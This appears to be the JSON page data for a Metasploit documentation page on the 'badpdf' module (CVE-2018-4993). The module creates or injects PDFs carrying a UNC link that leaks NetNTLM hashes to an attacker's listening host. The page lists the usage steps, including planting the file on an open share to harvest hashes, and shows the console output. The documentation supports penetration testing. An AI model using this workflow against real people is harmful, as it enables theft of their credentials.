{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/fileformat/badpdf","result":{"data":{"moduleMetadataJson":{"id":"5d26add9-e640-5ca5-9cbd-4c4465eb465c","name":"BADPDF Malicious PDF Creator","fullname":"auxiliary/fileformat/badpdf","description":"This module can either creates a blank PDF file which contains a UNC link which can be used\n          to capture NetNTLM credentials, or if the PDFINJECT option is used it will inject the necessary\n          code into an existing PDF document if possible.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/fileformat/badpdf","documentationSlug":"/modules/documentation/auxiliary/fileformat/badpdf","referencesSlug":"/modules/references/auxiliary/fileformat/badpdf"},"documentation":{"html":"<p>This module will either create a blank pdf document which contains a UNC link which will connect back to LHOST if file FILENAME options is used\nor if PDFINJECT option is used will try and inject the necessary UNC code into an existing PDF document.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Various PDF Readers. Note Adobe released the patch APSB18-09 to prevent this and\nFoxIT after version 9.1 is no longer vulnerable.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/fileformat/badpdf</code></li>\n<li>Customise Options as required</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>A file pointing back to the listening host will then be generated.</li>\n<li>Configure auxiliary/server/capture/smb or similar to capture hashes.</li>\n<li>Upload the document to an open share or similar and wait for hashes.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>FILENAME</strong>\nThis option allows you to customise the generated filename.\nThis can be changed using set FILENAME test.pdf</p>\n<p><strong>LHOST</strong>\nThis option allows you to set the IP address of the SMB Listener that the document points to\nThis can be changed using set LHOST 192.168.1.25</p>\n<p><strong>PDFINJECT</strong>\nThis option allows you to inject the UNC code into an existing PDF document\nThis can be changed using set PDFINJECT /path/to/file/pdf.pdf</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"microsoft-windows\" style=\"position:relative;\"><a href=\"#microsoft-windows\" aria-label=\"microsoft windows permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Microsoft Windows</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Console output</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(fileformat/badpdf) &gt; show info\n\n     Name: BADPDF Malicious PDF Creator\n   Module: auxiliary/fileformat/badpdf\n  License: Metasploit Framework License (BSD)\n     Rank: Normal\n\nProvided by:\nRichard Davy - secureyourit.co.uk\nCheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon\n\nBasic options:\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nFILENAME                    no        Filename\nLHOST                       yes       Host listening for incoming SMB/WebDAV traffic\nPDFINJECT                   no        Path and filename to existing PDF to inject UNC link code into\n\nDescription:\nThis module can either creates a blank PDF file which contains a UNC \nlink which can be used to capture NetNTLM credentials, or if the \nPDFINJECT option is used it will inject the necessary code into an \nexisting PDF document if possible.\n\nReferences:\nhttps://cvedetails.com/cve/CVE-2018-4993/\nhttps://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/\n\nmsf auxiliary(fileformat/badpdf) &gt; \n\nmsf auxiliary(fileformat/badpdf) &gt; set filename test.pdf\nfilename =&gt; test.pdf\nmsf auxiliary(fileformat/badpdf) &gt; set lhost 192.168.1.28\nlhost =&gt; 192.168.1.28\nmsf auxiliary(fileformat/badpdf) &gt; exploit\n\n[+] test.pdf stored at /root/.msf4/local/test.pdf\n[\\*] Auxiliary module execution completed\nmsf auxiliary(fileformat/badpdf) &gt; set filename &quot;&quot;\nfilename =&gt; \nmsf auxiliary(fileformat/badpdf) &gt; set pdfinject /root/Desktop/example.pdf\npdfinject =&gt; /root/Desktop/example.pdf\nmsf auxiliary(fileformat/badpdf) &gt; exploit\n\n[+] Malicious file writen to /root/Desktop/example_malicious.pdf\n[\\*] Auxiliary module execution completed\nmsf auxiliary(fileformat/badpdf) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"5d26add9-e640-5ca5-9cbd-4c4465eb465c"}}}